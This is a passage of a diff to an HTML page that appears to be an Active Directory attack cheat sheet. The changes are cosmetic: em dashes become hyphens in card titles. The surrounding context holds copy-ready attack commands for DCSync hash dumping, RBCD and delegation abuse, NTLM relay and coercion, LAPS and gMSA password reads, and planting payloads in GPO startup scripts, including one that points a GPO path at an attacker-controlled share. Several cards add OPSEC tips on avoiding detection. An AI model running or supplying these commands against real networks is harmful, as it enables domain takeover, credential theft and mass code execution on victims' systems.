     <li><strong>scriptPath:</strong> Runs when user logs in interactively. Requires logon event.</li>
 </ul></div>
@@ -1370,7 +1370,7 @@ ldapmodify -x -H ldap://<span class="var" data-var="DC_IP">{DC_IP}</span> -D '<s
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">GenericWrite on COMPUTER — RBCD, dNSHostName</h3>
+    <h3 class="card-title">GenericWrite on COMPUTER - RBCD, dNSHostName</h3>
     <p class="card-desc">Write msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD), msDS-KeyCredentialLink, servicePrincipalName, msDS-AdditionalDnsHostName, or dNSHostName (noPac/samaccountname spoofing).</p>
   </div>
 <div class="platform-tabs">
@@ -1472,7 +1472,7 @@ ldapmodify -x -H ldap://<span class="var" data-var="DC_IP">{DC_IP}</span> -D '<s
 <span class="badge badge-time">⏱️ N/A</span>
 <span class="badge badge-noise">🔊 Low</span>
     </div>
-    <h3 class="card-title">GenericExecute — Limited Standalone Value</h3>
+    <h3 class="card-title">GenericExecute - Limited Standalone Value</h3>
     <p class="card-desc">GenericExecute alone is rarely directly exploitable in AD. On GPO/OU it can enable execution of linked scripts if combined with write access to gPCFileSysPath.</p>
   </div>
 <div class="platform-tabs">
@@ -1524,7 +1524,7 @@ ldapmodify -x -H ldap://<span class="var" data-var="DC_IP">{DC_IP}</span> -D '<s
 <span class="badge badge-time">⏱️ 5 min</span>
 <span class="badge badge-noise">🔊 Low</span>
     </div>
-    <h3 class="card-title">GenericRead — Recon &amp; Enumeration</h3>
+    <h3 class="card-title">GenericRead - Recon &amp; Enumeration</h3>
     <p class="card-desc">Read all attributes of target object. Essential for reconnaissance to identify abuse paths, group memberships, ACLs, and sensitive attributes.</p>
   </div>
 <div class="platform-tabs">
@@ -1641,7 +1641,7 @@ netdom query fsmo</pre>
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">WriteDacl — Modify Permissions</h3>
+    <h3 class="card-title">WriteDacl - Modify Permissions</h3>
     <p class="card-desc">Modify the target object&#x27;s DACL. Grant yourself GenericAll, DCSync, or any other right. The ultimate privilege escalation primitive.</p>
   </div>
 <div class="platform-tabs">
@@ -1695,7 +1695,7 @@ $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(...)</pre>
     </div>
 <div class="tips-box"><h5><i class="fas fa-lightbulb"></i> TIPS & OPSEC</h5><ul>
     <li><strong>Backup created:</strong> dacledit.py automatically creates <code>.bak</code> file. Restore with <code>-action restore</code>.</li>
-    <li><strong>Event 4670:</strong> Object permission change logged. High noise — use during business hours.</li>
+    <li><strong>Event 4670:</strong> Object permission change logged. High noise - use during business hours.</li>
     <li><strong>Target formats:</strong> Can use samAccountName, DN, or SID as {TARGET}.</li>
     <li><strong>Common targets:</strong> Domain root (DC=htb,DC=local), users, groups, computers, GPOs.</li>
 </ul></div>
@@ -1741,7 +1741,7 @@ $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(...)</pre>
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">WriteOwner — Take Ownership</h3>
+    <h3 class="card-title">WriteOwner - Take Ownership</h3>
     <p class="card-desc">Change object owner. As owner, you can modify DACL even without explicit WriteDacl. Two-step escalation: WriteOwner → WriteDacl → GenericAll.</p>
   </div>
 <div class="platform-tabs">
@@ -1822,7 +1822,7 @@ $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(...)</pre>
 <span class="badge badge-time">⏱️ 1 min</span>
 <span class="badge badge-impact-high">🔊 VERY HIGH</span>
     </div>
-    <h3 class="card-title">Delete — Destructive Actions</h3>
+    <h3 class="card-title">Delete - Destructive Actions</h3>
     <p class="card-desc">Delete object → DoS or force recreation with weaker ACLs. Very high noise. Events 4726, 4743, 4730.</p>
   </div>
 <div class="platform-tabs">
@@ -1892,7 +1892,7 @@ $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(...)</pre>
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 Low</span>
     </div>
-    <h3 class="card-title">ReadControl — Read DACL</h3>
+    <h3 class="card-title">ReadControl - Read DACL</h3>
     <p class="card-desc">Read the object&#x27;s DACL to identify ACL abuse paths. Essential reconnaissance step.</p>
   </div>
 <div class="platform-tabs">
@@ -1971,7 +1971,7 @@ $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(...)</pre>
 <span class="badge badge-time">⏱️ 1 min</span>
 <span class="badge badge-noise">🔊 Low</span>
     </div>
-    <h3 class="card-title">ListChildren — Container Enumeration</h3>
+    <h3 class="card-title">ListChildren - Container Enumeration</h3>
     <p class="card-desc">List direct children of a container, OU, or domain. Used for AD structure reconnaissance.</p>
   </div>
 <div class="platform-tabs">
@@ -2043,7 +2043,7 @@ $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(...)</pre>
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">CreateChild — Account Creation</h3>
+    <h3 class="card-title">CreateChild - Account Creation</h3>
     <p class="card-desc">Create new computer or user accounts in a container, OU, or domain. Requires MachineAccountQuota &gt; 0 for computers.</p>
   </div>
 <div class="platform-tabs">
@@ -2126,7 +2126,7 @@ New-ADUser -Name 'pwned' -AccountPassword (ConvertTo-SecureString '<span class="
 <span class="badge badge-time">⏱️ 1 min</span>
 <span class="badge badge-impact-high">🔊 VERY HIGH</span>
     </div>
-    <h3 class="card-title">DeleteChild — Remove Children</h3>
+    <h3 class="card-title">DeleteChild - Remove Children</h3>
     <p class="card-desc">Delete child objects from a container or OU. Destructive and rarely used for escalation.</p>
   </div>
 <div class="platform-tabs">
@@ -2206,7 +2206,7 @@ New-ADUser -Name 'pwned' -AccountPassword (ConvertTo-SecureString '<span class="
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">ForceChangePassword — Reset Without Current</h3>
+    <h3 class="card-title">ForceChangePassword - Reset Without Current</h3>
     <p class="card-desc">Reset a user&#x27;s password without knowing the current password. Requires only extended right, not full GenericAll.</p>
   </div>
 <div class="platform-tabs">
@@ -2267,7 +2267,7 @@ New-ADUser -Name 'pwned' -AccountPassword (ConvertTo-SecureString '<span class="
     </div>
 <div class="tips-box"><h5><i class="fas fa-lightbulb"></i> TIPS & OPSEC</h5><ul>
     <li><strong>Event 4724:</strong> Password reset attempt logged. Less suspicious than GenericAll modification (4670).</li>
-    <li><strong>vs GenericAll:</strong> ForceChangePassword is more targeted — only password reset, not full control.</li>
+    <li><strong>vs GenericAll:</strong> ForceChangePassword is more targeted - only password reset, not full control.</li>
     <li><strong>Password policy:</strong> Must meet domain complexity requirements or reset fails.</li>
 </ul></div>
 <div class="error-box"><h5><i class="fas fa-triangle-exclamation"></i> COMMON ERRORS & FIXES</h5>
@@ -2310,7 +2310,7 @@ New-ADUser -Name 'pwned' -AccountPassword (ConvertTo-SecureString '<span class="
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">AllExtendedRights — Varies by Target</h3>
+    <h3 class="card-title">AllExtendedRights - Varies by Target</h3>
     <p class="card-desc">Grants all extended rights. On Domain=DCSync, User=ForceChangePassword, Computer=LAPS read. Context-dependent escalation.</p>
   </div>
 <div class="platform-tabs">
@@ -2319,7 +2319,7 @@ New-ADUser -Name 'pwned' -AccountPassword (ConvertTo-SecureString '<span class="
 </div>
     <div class="platform-content linux active">
 <div class="command-tier primary">
-  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">secretsdump.py — DCSync (Domain)</span><span class="tool-version">v0.12+</span></div>
+  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">secretsdump.py - DCSync (Domain)</span><span class="tool-version">v0.12+</span></div>
   <div class="code-block"><pre>secretsdump.py '<span class="var" data-var="DOMAIN">{DOMAIN}</span>/<span class="var" data-var="USERNAME">{USERNAME}</span>:<span class="var" data-var="PASSWORD">{PASSWORD}</span>'@<span class="var" data-var="DC_IP">{DC_IP}</span> -just-dc</pre>
     <div class="code-actions"><button class="btn-copy" onclick="copyCommand(this)"><i class="fas fa-copy"></i> Copy</button></div>
   </div>
@@ -2411,7 +2411,7 @@ New-ADUser -Name 'pwned' -AccountPassword (ConvertTo-SecureString '<span class="
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">DCSync — Domain Hash Replication</h3>
+    <h3 class="card-title">DCSync - Domain Hash Replication</h3>
     <p class="card-desc">Replicate password hashes from Domain Controller via MS-DRSR. Requires both DS-Replication-Get-Changes AND DS-Replication-Get-Changes-All.</p>
   </div>
 <div class="platform-tabs">
@@ -2520,7 +2520,7 @@ secretsdump.py -k -no-pass '<span class="var" data-var="DOMAIN">{DOMAIN}</span>/
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">ReadLAPSPassword — LAPS Dump</h3>
+    <h3 class="card-title">ReadLAPSPassword - LAPS Dump</h3>
     <p class="card-desc">Read the local administrator password stored by LAPS. Legacy: ms-Mcs-AdmPwd. Modern Windows LAPS: msLAPS-Password.</p>
   </div>
 <div class="platform-tabs">
@@ -2621,7 +2621,7 @@ secretsdump.py -k -no-pass '<span class="var" data-var="DOMAIN">{DOMAIN}</span>/
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">ReadGMSAPassword — gMSA Dump</h3>
+    <h3 class="card-title">ReadGMSAPassword - gMSA Dump</h3>
     <p class="card-desc">Read Group Managed Service Account password. Requires KDS root key to decrypt. Get KDS key via DCSync first.</p>
   </div>
 <div class="platform-tabs">
@@ -2697,7 +2697,7 @@ ConvertFrom-ADManagedPasswordBlob -Blob $blob.msDS-ManagedPassword</pre>
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">DumpSMSAPassword — sMSA Dump</h3>
+    <h3 class="card-title">DumpSMSAPassword - sMSA Dump</h3>
     <p class="card-desc">Dump standalone Managed Service Account password. Requires local admin on host where sMSA is installed.</p>
   </div>
 <div class="platform-tabs">
@@ -2767,7 +2767,7 @@ lsadump::secrets</pre>
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">SyncLAPSPassword — Domain-Wide LAPS</h3>
+    <h3 class="card-title">SyncLAPSPassword - Domain-Wide LAPS</h3>
     <p class="card-desc">Windows LAPS domain-wide replication synchronization. Can read all LAPS passwords across domain.</p>
   </div>
 <div class="platform-tabs">
@@ -2841,7 +2841,7 @@ lsadump::secrets</pre>
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">AllowedToDelegate — Constrained Delegation (S4U2Proxy)</h3>
+    <h3 class="card-title">AllowedToDelegate - Constrained Delegation (S4U2Proxy)</h3>
     <p class="card-desc">Target account is allowed to delegate to specific SPNs. Abuse with S4U2Proxy to impersonate users.</p>
   </div>
 <div class="platform-tabs">
@@ -2922,7 +2922,7 @@ kekeo.exe "tgs::s4u /tgt:TGT.kirbi /user:Administrator@<span class="var" data-va
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">AllowedToAct — RBCD Already Configured</h3>
+    <h3 class="card-title">AllowedToAct - RBCD Already Configured</h3>
     <p class="card-desc">The target computer already has an attacker-controlled principal in msDS-AllowedToActOnBehalfOfOtherIdentity. Immediate S4U attack with no setup required.</p>
   </div>
 <div class="platform-tabs">
@@ -3008,7 +3008,7 @@ wmiexec.py -k -no-pass '<span class="var" data-var="DOMAIN">{DOMAIN}</span>/Admi
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">WriteAccountRestrictions — RBCD Setup</h3>
+    <h3 class="card-title">WriteAccountRestrictions - RBCD Setup</h3>
     <p class="card-desc">Write msDS-AllowedToActOnBehalfOfOtherIdentity or userAccountControl. Used to set up RBCD or change delegation flags.</p>
   </div>
 <div class="platform-tabs">
@@ -3102,7 +3102,7 @@ wmiexec.py -k -no-pass '<span class="var" data-var="DOMAIN">{DOMAIN}</span>/Admi
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">WriteSPN — SPN Jacking</h3>
+    <h3 class="card-title">WriteSPN - SPN Jacking</h3>
     <p class="card-desc">Add or remove Service Principal Names on user or computer accounts. Add fake SPN then Kerberoast it.</p>
   </div>
 <div class="platform-tabs">
@@ -3201,7 +3201,7 @@ Set-DomainObject -Identity <span class="var" data-var="TARGET_USER">{TARGET_USER
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">AddKeyCredentialLink — Shadow Credentials</h3>
+    <h3 class="card-title">AddKeyCredentialLink - Shadow Credentials</h3>
     <p class="card-desc">Add a KeyCredentialLink (msDS-KeyCredentialLink) to user or computer. Authenticate via PKINIT and extract NTLM hash.</p>
   </div>
 <div class="platform-tabs">
@@ -3293,7 +3293,7 @@ Add-ADKeyCredential -AccountName <span class="var" data-var="TARGET">{TARGET}</s
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">AddAllowedToAct — RBCD Configuration</h3>
+    <h3 class="card-title">AddAllowedToAct - RBCD Configuration</h3>
     <p class="card-desc">Same as WriteAccountRestrictions for RBCD setup. Write msDS-AllowedToActOnBehalfOfOtherIdentity to configure delegation.</p>
   </div>
 <div class="platform-tabs">
@@ -3370,7 +3370,7 @@ Add-ADKeyCredential -AccountName <span class="var" data-var="TARGET">{TARGET}</s
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">AddMember — Group Membership</h3>
+    <h3 class="card-title">AddMember - Group Membership</h3>
     <p class="card-desc">Add any user to the target group. Unlike AddSelf, can add arbitrary users.</p>
   </div>
 <div class="platform-tabs">
@@ -3463,7 +3463,7 @@ Add-ADKeyCredential -AccountName <span class="var" data-var="TARGET">{TARGET}</s
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">AddSelf — Add Yourself to Group</h3>
+    <h3 class="card-title">AddSelf - Add Yourself to Group</h3>
     <p class="card-desc">Add your own account to the target group. Immediate privilege escalation if group is privileged.</p>
   </div>
 <div class="platform-tabs">
@@ -3534,7 +3534,7 @@ Add-ADKeyCredential -AccountName <span class="var" data-var="TARGET">{TARGET}</s
 <span class="badge badge-time">⏱️ N/A</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">ClaimSpecialIdentity — Special Identity Abuse</h3>
+    <h3 class="card-title">ClaimSpecialIdentity - Special Identity Abuse</h3>
     <p class="card-desc">Rare edge. Modify special identities like Authenticated Users. Requires custom DACL manipulation.</p>
   </div>
 <div class="platform-tabs">
@@ -3608,7 +3608,7 @@ Add-ADKeyCredential -AccountName <span class="var" data-var="TARGET">{TARGET}</s
 <span class="badge badge-time">⏱️ 1 min</span>
 <span class="badge badge-noise">🔊 Low</span>
     </div>
-    <h3 class="card-title">HasSIDHistory — Inherited Privileges</h3>
+    <h3 class="card-title">HasSIDHistory - Inherited Privileges</h3>
     <p class="card-desc">User or group has a privileged SID in sIDHistory. Already effective if the SID is from a privileged group.</p>
   </div>
 <div class="platform-tabs">
@@ -3687,7 +3687,7 @@ Add-ADKeyCredential -AccountName <span class="var" data-var="TARGET">{TARGET}</s
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">SpoofSIDHistory — Cross-Forest SID Abuse</h3>
+    <h3 class="card-title">SpoofSIDHistory - Cross-Forest SID Abuse</h3>
     <p class="card-desc">Requires weak SID filtering (quarantine = No). Add arbitrary SID to sIDHistory for cross-forest privilege escalation.</p>
   </div>
 <div class="platform-tabs">
@@ -3768,7 +3768,7 @@ Add-ADKeyCredential -AccountName <span class="var" data-var="TARGET">{TARGET}</s
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">HasSession — Compromise Computer → Dump LSASS</h3>
+    <h3 class="card-title">HasSession - Compromise Computer → Dump LSASS</h3>
     <p class="card-desc">User has an active session on a computer. Compromise the computer to dump LSASS and steal credentials.</p>
   </div>
 <div class="platform-tabs">
@@ -3887,7 +3887,7 @@ Add-ADKeyCredential -AccountName <span class="var" data-var="TARGET">{TARGET}</s
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">HasTrustKeys — Trust Account Compromise</h3>
+    <h3 class="card-title">HasTrustKeys - Trust Account Compromise</h3>
     <p class="card-desc">Compromise trust account NT hash. Can forge inter-realm TGTs for cross-domain access.</p>
   </div>
 <div class="platform-tabs">
@@ -3977,7 +3977,7 @@ Add-ADKeyCredential -AccountName <span class="var" data-var="TARGET">{TARGET}</s
 <span class="badge badge-time">⏱️ 1 min</span>
 <span class="badge badge-noise">🔊 Low</span>
     </div>
-    <h3 class="card-title">MemberOf — Group Membership Analysis</h3>
+    <h3 class="card-title">MemberOf - Group Membership Analysis</h3>
     <p class="card-desc">User is member of group. Enumerate group memberships to find privilege escalation paths.</p>
   </div>
 <div class="platform-tabs">
@@ -4055,7 +4055,7 @@ Add-ADKeyCredential -AccountName <span class="var" data-var="TARGET">{TARGET}</s
 <span class="badge badge-time">⏱️ 1 min</span>
 <span class="badge badge-noise">🔊 Low</span>
     </div>
-    <h3 class="card-title">Contains — Container Enumeration</h3>
+    <h3 class="card-title">Contains - Container Enumeration</h3>
     <p class="card-desc">Object is contained within a container or OU. Recon edge for AD structure mapping.</p>
   </div>
 <div class="platform-tabs">
@@ -4135,7 +4135,7 @@ Add-ADKeyCredential -AccountName <span class="var" data-var="TARGET">{TARGET}</s
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">AdminTo — Local Administrator</h3>
+    <h3 class="card-title">AdminTo - Local Administrator</h3>
     <p class="card-desc">You are a local administrator on the target computer. Full control over the system.</p>
   </div>
 <div class="platform-tabs">
@@ -4274,7 +4274,7 @@ psexec.py -k -no-pass '<span class="var" data-var="DOMAIN">{DOMAIN}</span>/<span
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">CanPSRemote — WinRM Access</h3>
+    <h3 class="card-title">CanPSRemote - WinRM Access</h3>
     <p class="card-desc">Can connect via PowerShell Remoting / WinRM. Uses ports 5985 (HTTP) and 5986 (HTTPS).</p>
   </div>
 <div class="platform-tabs">
@@ -4386,7 +4386,7 @@ psexec.py -k -no-pass '<span class="var" data-var="DOMAIN">{DOMAIN}</span>/<span
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">CanRDP — Remote Desktop</h3>
+    <h3 class="card-title">CanRDP - Remote Desktop</h3>
     <p class="card-desc">Can connect via RDP. Logon Type 10. High visibility but direct interactive access.</p>
   </div>
 <div class="platform-tabs">
@@ -4486,7 +4486,7 @@ psexec.py -k -no-pass '<span class="var" data-var="DOMAIN">{DOMAIN}</span>/<span
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">ExecuteDCOM — DCOM Execution</h3>
+    <h3 class="card-title">ExecuteDCOM - DCOM Execution</h3>
     <p class="card-desc">Execute code via DCOM. Bypasses many AV/EDR products that monitor SMB/WinRM.</p>
   </div>
 <div class="platform-tabs">
@@ -4563,7 +4563,7 @@ $obj.Document.Application.ShellExecute('cmd.exe','/c whoami','c:\\windows\\syste
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">SQLAdmin — MSSQL Compromise</h3>
+    <h3 class="card-title">SQLAdmin - MSSQL Compromise</h3>
     <p class="card-desc">Administrative access to MSSQL instance. Can enable xp_cmdshell for code execution.</p>
   </div>
 <div class="platform-tabs">
@@ -4657,7 +4657,7 @@ Get-SQLServerLinkCrawl -Instance <span class="var" data-var="TARGET_COMPUTER">{T
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">DCFor — Domain Controller Compromise</h3>
+    <h3 class="card-title">DCFor - Domain Controller Compromise</h3>
     <p class="card-desc">Target is a Domain Controller. Compromise it for full domain control via DCSync, Golden Ticket, or exploit.</p>
   </div>
 <div class="platform-tabs">
@@ -4762,7 +4762,7 @@ samtheadmin.py '<span class="var" data-var="DOMAIN">{DOMAIN}</span>/<span class=
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">CoerceToTGT — Unconstrained Delegation</h3>
+    <h3 class="card-title">CoerceToTGT - Unconstrained Delegation</h3>
     <p class="card-desc">Compromise unconstrained delegation computer → coerce DC → capture TGT → DCSync.</p>
   </div>
 <div class="platform-tabs">
@@ -4859,7 +4859,7 @@ SpoolSample.exe <span class="var" data-var="TARGET_DC_IP">{TARGET_DC_IP}</span> 
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">CoerceAndRelayNTLMToSMB — NTLM Relay to SMB</h3>
+    <h3 class="card-title">CoerceAndRelayNTLMToSMB - NTLM Relay to SMB</h3>
     <p class="card-desc">Coerce target to authenticate via NTLM, then relay to SMB on another target.</p>
   </div>
 <div class="platform-tabs">
@@ -4928,7 +4928,7 @@ SpoolSample.exe <span class="var" data-var="TARGET_DC_IP">{TARGET_DC_IP}</span> 
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">CoerceAndRelayNTLMToLDAP — NTLM Relay to LDAP</h3>
+    <h3 class="card-title">CoerceAndRelayNTLMToLDAP - NTLM Relay to LDAP</h3>
     <p class="card-desc">Coerce target to authenticate via NTLM, then relay to LDAP to modify directory objects.</p>
   </div>
 <div class="platform-tabs">
@@ -4991,7 +4991,7 @@ SpoolSample.exe <span class="var" data-var="TARGET_DC_IP">{TARGET_DC_IP}</span> 
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">CoerceAndRelayNTLMToLDAPS — NTLM Relay to LDAPS</h3>
+    <h3 class="card-title">CoerceAndRelayNTLMToLDAPS - NTLM Relay to LDAPS</h3>
     <p class="card-desc">Coerce target to authenticate via NTLM, then relay to LDAPS. Channel binding (EPA) may block this.</p>
   </div>
 <div class="platform-tabs">
@@ -5047,7 +5047,7 @@ SpoolSample.exe <span class="var" data-var="TARGET_DC_IP">{TARGET_DC_IP}</span> 
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">CoerceAndRelayNTLMToADCS — ESC8</h3>
+    <h3 class="card-title">CoerceAndRelayNTLMToADCS - ESC8</h3>
     <p class="card-desc">Coerce target to authenticate to AD CS Web Enrollment, relay for certificate issuance.</p>
   </div>
 <div class="platform-tabs">
@@ -5137,7 +5137,7 @@ SpoolSample.exe <span class="var" data-var="TARGET_DC_IP">{TARGET_DC_IP}</span> 
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">GenericAll on GPO — Mass Compromise</h3>
+    <h3 class="card-title">GenericAll on GPO - Mass Compromise</h3>
     <p class="card-desc">Modify Group Policy Object settings to execute code on all computers where the GPO is applied. Immediate domain-wide or OU-wide compromise.</p>
   </div>
 <div class="platform-tabs">
@@ -5152,7 +5152,7 @@ SpoolSample.exe <span class="var" data-var="TARGET_DC_IP">{TARGET_DC_IP}</span> 
   </div>
 </div>
 <div class="command-tier alternative">
-  <div class="tier-header alternative"><span class="tier-rank">🥈</span><span class="tool-name">bloodyAD — SYSVOL write</span><span class="tool-version">v2.0+</span></div>
+  <div class="tier-header alternative"><span class="tier-rank">🥈</span><span class="tool-name">bloodyAD - SYSVOL write</span><span class="tool-version">v2.0+</span></div>
   <div class="code-block"><pre>smbclient //<span class="var" data-var="DC_IP">{DC_IP}</span>/SYSVOL -U '<span class="var" data-var="DOMAIN">{DOMAIN}</span>/<span class="var" data-var="USERNAME">{USERNAME}</span>%<span class="var" data-var="PASSWORD">{PASSWORD}</span>' -c 'cd <span class="var" data-var="DOMAIN">{DOMAIN}</span>/Policies/<span class="var" data-var="GPO_GUID">{GPO_GUID}</span>/Machine/Scripts/Startup; put payload.bat'</pre>
     <div class="code-actions"><button class="btn-copy" onclick="copyCommand(this)"><i class="fas fa-copy"></i> Copy</button></div>
   </div>
@@ -5173,7 +5173,7 @@ SharpGPOAbuse.exe --AddComputerTask --GPOID '<span class="var" data-var="GPO_GUI
   </div>
 </div>
 <div class="command-tier alternative">
-  <div class="tier-header alternative"><span class="tier-rank">🥈</span><span class="tool-name">PowerView — Modify GPC</span><span class="tool-version">PowerSploit</span></div>
+  <div class="tier-header alternative"><span class="tier-rank">🥈</span><span class="tool-name">PowerView - Modify GPC</span><span class="tool-version">PowerSploit</span></div>
   <div class="code-block"><pre>Set-DomainObject -Identity '<span class="var" data-var="GPO_GUID">{GPO_GUID}</span>' -Set @{gPCFileSysPath='\<span class="var" data-var="ATTACKER_IP">{ATTACKER_IP}</span>\share\fakegpo'} -Credential </pre>
     <div class="code-actions"><button class="btn-copy" onclick="copyCommand(this)"><i class="fas fa-copy"></i> Copy</button></div>
   </div>
@@ -5187,7 +5187,7 @@ SharpGPOAbuse.exe --AddComputerTask --GPOID '<span class="var" data-var="GPO_GUI
     </div>
 <div class="tips-box"><h5><i class="fas fa-lightbulb"></i> TIPS & OPSEC</h5><ul>
     <li><strong>GPO refresh:</strong> Default is 90 min (random offset). Force with <code>gpupdate /force</code> on target.</li>
-    <li><strong>SYSVOL:</strong> All domain users can read SYSVOL. Be careful with payload placement — visible to defenders.</li>
+    <li><strong>SYSVOL:</strong> All domain users can read SYSVOL. Be careful with payload placement - visible to defenders.</li>
     <li><strong>OPSEC:</strong> GPO modifications create Event 5136/5137. Very high visibility.</li>
     <li><strong>Cleanup:</strong> Remove startup scripts/tasks after compromise. Restore original GPC files.</li>
 </ul></div>
@@ -5228,7 +5228,7 @@ SharpGPOAbuse.exe --AddComputerTask --GPOID '<span class="var" data-var="GPO_GUI
 <span class="badge badge-time">⏱️ 2 min</span>
 <span class="badge badge-noise">🔊 High</span>
     </div>
-    <h3 class="card-title">GenericAll on OU — Descendant Control</h3>
+    <h3 class="card-title">GenericAll on OU - Descendant Control</h3>
     <p class="card-desc">Grant full control over all objects within the OU. Can link malicious GPOs or modify inheritance to affect child objects.</p>
   </div>
 <div class="platform-tabs">
@@ -5237,7 +5237,7 @@ SharpGPOAbuse.exe --AddComputerTask --GPOID '<span class="var" data-var="GPO_GUI
 </div>
     <div class="platform-content linux active">
 <div class="command-tier primary">
-  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">bloodyAD — Grant descendant GenericAll</span><span class="tool-version">v2.0+</span></div>
+  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">bloodyAD - Grant descendant GenericAll</span><span class="tool-version">v2.0+</span></div>
   <div class="code-block"><pre>bloodyAD --host <span class="var" data-var="DC_IP">{DC_IP}</span> -d <span class="var" data-var="DOMAIN">{DOMAIN}</span> -u <span class="var" data-var="USERNAME">{USERNAME}</span> -p '<span class="var" data-var="PASSWORD">{PASSWORD}</span>' add genericAll <span class="var" data-var="OU_DN">{OU_DN}</span> <span class="var" data-var="USERNAME">{USERNAME}</span></pre>
     <div class="code-actions"><button class="btn-copy" onclick="copyCommand(this)"><i class="fas fa-copy"></i> Copy</button></div>
   </div>
@@ -5249,7 +5249,7 @@ SharpGPOAbuse.exe --AddComputerTask --GPOID '<span class="var" data-var="GPO_GUI
   </div>
 </div>
 <div class="command-tier primary">
-  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">bloodyAD — Link malicious GPO</span><span class="tool-version">v2.0+</span></div>
+  <div class="tier-header primary"><span class="tier-rank">🥇</span><span class="tool-name">bloodyAD - Link malicious GPO</span><span class="tool-version">v2.0+</span></div>
   <div class="code-block"><pre>bloodyAD --host <span class="var" data-var="DC_IP">{DC_IP}</span> -d <span class="var" data-var="DOMAIN">{DOMAIN}</span> -u <span class="var" data-var="USERNAME">{USERNAME}</span> -p '<span class="var" data-var="PASSWORD">{PASSWORD}</span>' set gplink '<span class="var" data-var="OU_DN">{OU_DN}</span>' {<span class="var" data-var="GPO_GUID">{GPO_GUID}</span>}</pre>
     <div class="code-actions"><button class="btn-copy" onclick="copyCommand(this)"><i class="fas fa-copy"></i> Copy</button></div>
   </div>
@@ -5263,7 +5263,7 @@ SharpGPOAbuse.exe --AddComputerTask --GPOID '<span class="var" data-var="GPO_GUI
     </div>
     <div class="platform-content windows">
